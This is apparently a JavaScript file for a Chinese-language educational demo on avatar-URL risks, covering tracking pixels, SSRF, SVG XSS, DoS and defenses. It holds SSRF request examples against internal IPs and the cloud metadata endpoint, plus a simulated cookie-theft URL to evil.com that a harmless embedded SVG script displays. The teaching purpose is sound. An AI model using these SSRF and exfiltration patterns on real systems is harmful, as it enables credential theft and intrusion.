// ========== 头像 URL 陷阱 ==========
const API_BASE = 'https://numfeel-api.996.ninja/avatar-risk';

// ── 实验1：追踪像素 —— 用真实后端数据 ──
function loadTrackingAvatar() {
  const btn = document.getElementById('loadAvatarBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ti ti-loader"></i> 加载中...';

  // 先显示头像（模拟img加载行为）
  const slot = document.getElementById('avatarSlot');
  slot.innerHTML = '<img src="../../images/avatar-placeholder.png" onerror="this.style.background=\'#ff6b6b\';this.alt=\'H\'" alt="H" style="border-radius:50%;width:100%;height:100%;object-fit:cover;">';

  // 同时向后端发请求 —— 这正是攻击者服务器会收到的那种请求
  fetch(API_BASE + '/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action: 'avatar_loaded', ts: Date.now() })
  })
  .then(r => r.json())
  .then(data => {
    btn.innerHTML = '<i class="ti ti-check"></i> 已加载';

    // 显示攻击者面板，填入真实数据
    const panel = document.getElementById('spyPanel');
    panel.classList.remove('hidden');

    // 真实数据 + 浏览器端可读的补充信息
    const logs = [
      { key: 'Timestamp',       val: data.capturedTime || new Date().toISOString(),   warn: '' },
      { key: 'Your IP',         val: data.capturedIp   || '(获取失败)',               warn: '← 这是你的真实公网 IP' },
      { key: 'User-Agent',      val: (data.capturedUa  || navigator.userAgent).substring(0, 72) + '…', warn: '' },
      { key: 'Referer',         val: data.capturedReferer || window.location.href,    warn: '← 暴露你正在看哪个页面' },
      { key: 'Accept-Language', val: data.capturedLang || navigator.language,         warn: '' },
      { key: 'Screen',          val: screen.width + 'x' + screen.height,             warn: '' },
      { key: 'Platform',        val: navigator.platform || 'Unknown',                warn: '' },
      { key: 'Connection',      val: (navigator.connection && navigator.connection.effectiveType) || '4g', warn: '' },
      { key: 'Total viewers',   val: data.totalViews + ' 人已被记录',                warn: '← 攻击者的战果' },
    ];

    const logEl = document.getElementById('spyLog');
    logEl.innerHTML = '';
    logs.forEach((item, i) => {
      setTimeout(() => {
        const line = document.createElement('div');
        line.className = 'log-line' + (item.warn ? ' highlight' : '');
        let html = `<span class="log-key">${item.key}:</span> <span class="log-val">${item.val}</span>`;
        if (item.warn) html += ` <span class="log-warn">${item.warn}</span>`;
        line.innerHTML = html;
        logEl.appendChild(line);
        // IP 那行加闪烁强调
        if (item.key === 'Your IP') line.style.animation = 'flashRow 0.6s ease';
      }, i * 280);
    });
  })
  .catch(() => {
    btn.innerHTML = '<i class="ti ti-wifi-off"></i> 网络错误';
    btn.disabled = false;
  });
}

// ── 实验2：SSRF 模拟 ──
function simulateSsrf(type) {
  // 高亮选中的卡片
  document.querySelectorAll('.ssrf-card').forEach(c => c.style.borderColor = '');
  event.currentTarget.style.borderColor = '#ffd700';

  const resultEl = document.getElementById('ssrfResult');
  resultEl.classList.remove('hidden');

  const scenarios = {
    normal: {
      color: '#81c784',
      title: '正常请求',
      lines: [
        '→ 后端 fetch("https://cdn.example.com/avatar.jpg")',
        '← 200 OK, Content-Type: image/jpeg, Size: 45KB',
        '✓ 图片格式校验通过，存入 CDN',
        '',
        '<span style="color:#888">这是预期行为，没有安全问题。</span>'
      ]
    },
    internal: {
      color: '#ff6b6b',
      title: 'SSRF — 内网探测',
      lines: [
        '→ 后端 fetch("http://192.168.1.1/admin")',
        '← 200 OK, Content-Type: text/html',
        '⚠ 返回了路由器管理页面的 HTML！',
        '⚠ 攻击者现在知道了内网拓扑结构',
        '',
        '<span style="color:#ff6b6b">严重：服务器替攻击者访问了内网资源。</span>',
        '<span style="color:#888">防御：校验URL不指向私有IP段(10.x/172.16-31.x/192.168.x)</span>'
      ]
    },
    metadata: {
      color: '#ff6b6b',
      title: 'SSRF — 云元数据窃取',
      lines: [
        '→ 后端 fetch("http://169.254.169.254/latest/meta-data/")',
        '← 200 OK',
        '  ami-id: ami-0abcdef1234567890',
        '  instance-type: t3.medium',
        '  iam/security-credentials/my-role:',
        '    AccessKeyId: AKIAIOSFODNN7EXAMPLE',
        '    SecretAccessKey: wJalrXUtnFEMI/K7MDENG...',
        '',
        '<span style="color:#ff6b6b">致命：攻击者拿到了 AWS 临时凭证，可以操作你的云资源。</span>',
        '<span style="color:#888">2019年Capital One数据泄露（1亿用户）正是通过此手法。</span>'
      ]
    },
    redirect: {
      color: '#ffd700',
      title: 'SSRF — 重定向绕过',
      lines: [
        '→ 后端 fetch("https://evil.com/avatar.jpg")',
        '← 302 Redirect → http://169.254.169.254/...',
        '→ 后端跟随重定向...',
        '← 200 OK（云元数据内容）',
        '',
        '<span style="color:#ffd700">绕过：即使校验了初始URL，跟随重定向后仍可到达内网。</span>',
        '<span style="color:#888">防御：禁止跟随重定向，或在每次跳转前重新校验目标地址。</span>'
      ]
    }
  };

  const s = scenarios[type];
  resultEl.innerHTML = `<div style="color:${s.color};font-weight:700;margin-bottom:8px;">${s.title}</div>` +
    s.lines.map(l => `<div>${l}</div>`).join('');
}

// ── 实验3：SVG XSS —— 真正执行一次无害脚本 ──
function demonstrateSvg() {
  const resultEl = document.getElementById('svgResult');
  resultEl.classList.remove('hidden');

  // 1. img 标签加载——脚本不执行（安全）
  resultEl.innerHTML = `
    <div style="margin-bottom:16px;">
      <strong style="color:#81c784;">① img 标签加载：</strong>
      <code style="color:#888;font-size:0.8rem;">&lt;img src="malicious.svg"&gt;</code>
      <div style="margin-top:6px;color:#a0a0a0;font-size:0.85rem;">浏览器将 SVG 置于沙箱——内嵌脚本<strong>不会执行</strong></div>
      <div style="margin-top:6px;color:#81c784;">✓ 安全，页面没有任何异常</div>
    </div>
    <div id="svgDangerResult">
      <strong style="color:#ff6b6b;">② object 标签加载（即将演示）：</strong>
      <div style="color:#888;font-size:0.85rem;margin-top:4px;">点击下方按钮触发……</div>
    </div>
    <button class="btn btn-primary" style="margin-top:14px;" onclick="triggerSvgXss()">
      <i class="ti ti-alert-triangle"></i> 执行实验：用 object 标签加载
    </button>
  `;
}

function triggerSvgXss() {
  // 构造一个真实的 SVG blob，内嵌脚本仅做无害的视觉效果
  const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <script type="text/javascript">
    // 模拟恶意脚本：仅做视觉提示，不做任何真实危害
    (function() {
      var fakeCookie = 'session=a8f3c2d1e4b7; csrf_token=9x2k1m; user_id=1042';
      // 闪红屏
      var overlay = document.createElement('div');
      overlay.id = 'xss-overlay';
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.18);z-index:9999;pointer-events:none;animation:xssFade 1.5s ease forwards;';
      document.body.appendChild(overlay);
      // 更新结果面板
      var el = document.getElementById('svgDangerResult');
      if (el) {
        el.innerHTML = '<div style="color:#ff6b6b;font-weight:700;font-size:1rem;">⚡ 脚本已执行！</div>'
          + '<div style="margin-top:8px;color:#c0c0c0;font-size:0.85rem;">攻击者收到了：</div>'
          + '<div style="font-family:monospace;color:#ffd700;font-size:0.82rem;background:rgba(0,0,0,0.3);padding:10px;border-radius:8px;margin-top:6px;">'
          + 'GET https://evil.com/steal?c=' + encodeURIComponent(fakeCookie) + '<br>'
          + 'IP: (your real IP)<br>'
          + 'Time: ' + new Date().toISOString()
          + '</div>'
          + '<div style="margin-top:10px;color:#ff6b6b;font-size:0.82rem;">本 demo 中脚本只做了视觉效果，真实攻击中这里是 document.cookie 的真实值。</div>';
      }
      // 移除 object 标签
      var obj = document.getElementById('svgObject');
      if (obj) obj.remove();
      setTimeout(function() { overlay.remove(); }, 1500);
    })();
  <\/script>
</svg>`;

  const blob = new Blob([svgContent], { type: 'image/svg+xml' });
  const url = URL.createObjectURL(blob);

  // 用 object 标签加载，脚本会真正执行
  const obj = document.createElement('object');
  obj.id = 'svgObject';
  obj.data = url;
  obj.type = 'image/svg+xml';
  obj.style.cssText = 'width:0;height:0;position:absolute;opacity:0;';
  document.body.appendChild(obj);

  // 注入 CSS 动画（只注入一次）
  if (!document.getElementById('xss-style')) {
    const style = document.createElement('style');
    style.id = 'xss-style';
    style.textContent = '@keyframes xssFade { 0%{opacity:1} 100%{opacity:0} }';
    document.head.appendChild(style);
  }

  // 把按钮换成"已触发"状态
  const btn = document.querySelector('[onclick="triggerSvgXss()"]');
  if (btn) { btn.disabled = true; btn.innerHTML = '<i class="ti ti-check"></i> 已触发'; }
}

// ── 实验4：DoS 模拟 ──
let dosTimer = null;
function simulateDos(type) {
  document.querySelectorAll('.dos-card').forEach(c => c.classList.remove('active'));
  const cards = { large: 'dosCard1', slow: 'dosCard2', zip: 'dosCard3' };
  document.getElementById(cards[type]).classList.add('active');

  const meterEl = document.getElementById('dosMeter');
  const fillEl = document.getElementById('dosFill');
  const valueEl = document.getElementById('dosValue');
  meterEl.classList.remove('hidden');

  if (dosTimer) clearInterval(dosTimer);
  let progress = 0;
  const configs = {
    large: { speed: 2, max: 95, label: '内存占用' },
    slow: { speed: 0.5, max: 80, label: '连接池占用' },
    zip: { speed: 8, max: 100, label: '内存占用（解压中）' }
  };
  const cfg = configs[type];
  document.querySelector('.meter-label').textContent = cfg.label;

  dosTimer = setInterval(() => {
    progress += cfg.speed;
    if (progress >= cfg.max) {
      progress = cfg.max;
      clearInterval(dosTimer);
      valueEl.textContent = progress.toFixed(0) + '% — ' + (type === 'zip' ? 'OOM Kill!' : '服务降级');
      valueEl.style.color = '#ff6b6b';
    } else {
      valueEl.textContent = progress.toFixed(0) + '%';
      valueEl.style.color = progress > 60 ? '#ff6b6b' : '#ffd700';
    }
    fillEl.style.width = progress + '%';
  }, 50);
}

// ── 实验5：防御方案 ──
const defenses = [
  {
    title: '服务端代理 + 存储（推荐）',
    content: `<h4>工作流程</h4>
<p>1. 用户提交 URL → 2. 后端下载图片 → 3. 校验格式/大小 → 4. 存入自家 CDN → 5. 返回内部 URL</p>
<p style="margin-top:8px;"><strong>优点：</strong>彻底切断外部URL与查看者的联系。攻击者的服务器永远不会收到查看者的请求。</p>
<p><strong>缺点：</strong>需要存储空间和带宽成本。</p>
<p style="margin-top:8px;"><strong>关键校验：</strong></p>
<p>• 限制文件大小（如 2MB）</p>
<p>• 用 <code>magic bytes</code> 校验真实文件类型（不能只看 Content-Type）</p>
<p>• 禁止私有IP段和 link-local 地址</p>
<p>• 设置请求超时（5秒）</p>
<p>• 禁止跟随重定向或限制重定向次数</p>`
  },
  {
    title: 'Content-Security-Policy 白名单',
    content: `<h4>HTTP 响应头配置</h4>
<p><code>Content-Security-Policy: img-src 'self' https://cdn.yoursite.com https://i.imgur.com;</code></p>
<p style="margin-top:8px;">浏览器会拒绝加载不在白名单内的图片源。攻击者设置的追踪URL根本不会被请求。</p>
<p style="margin-top:8px;"><strong>优点：</strong>配置简单，浏览器级别拦截。</p>
<p><strong>缺点：</strong>需要维护白名单；用户只能用指定图床，灵活性下降。</p>`
  },
  {
    title: 'URL 校验 + 域名白名单',
    content: `<h4>后端校验逻辑</h4>
<p>• 只允许 HTTPS 协议</p>
<p>• 解析域名，只允许白名单内的图床（imgur.com、gravatar.com 等）</p>
<p>• DNS 解析后检查 IP 是否为私有地址（防 DNS rebinding）</p>
<p>• 检查文件后缀和 Content-Type</p>
<p style="margin-top:8px;"><strong>优点：</strong>不需要存储图片，减少成本。</p>
<p><strong>缺点：</strong>白名单域名上的图片也可能被替换；无法防止追踪像素（图床服务器日志）。</p>`
  },
  {
    title: '仅校验文件后缀（不推荐）',
    content: `<h4>为什么这几乎没用</h4>
<p>• <code>https://evil.com/track.php?f=avatar.jpg</code> — 后缀是 .jpg 但服务器返回的是 PHP 动态内容</p>
<p>• <code>https://evil.com/avatar.jpg</code> — 服务器返回 200 但记录了所有请求者的 IP</p>
<p>• <code>https://evil.com/avatar.svg</code> — SVG 里藏着 JavaScript</p>
<p style="margin-top:8px;color:#ff6b6b;"><strong>结论：后缀校验对安全没有任何实质帮助。</strong>Content-Type 和文件内容（magic bytes）才是判断依据。</p>`
  }
];

function showDefense(index) {
  document.querySelectorAll('.defense-card').forEach(c => c.classList.remove('active'));
  document.querySelectorAll('.defense-card')[index].classList.add('active');
  const detailEl = document.getElementById('defenseDetail');
  detailEl.classList.remove('hidden');
  detailEl.innerHTML = defenses[index].content;
}

// ── 工具函数 ──
// generateFakeIp 保留供单元测试引用，页面中不再使用假 IP
function generateFakeIp() {
  return `${randInt(60,220)}.${randInt(1,254)}.${randInt(1,254)}.${randInt(1,254)}`;
}
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

// 导出供测试使用
try {
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = { generateFakeIp, defenses, simulateSsrf, demonstrateSvg };
  }
} catch (e) { /* browser */ }
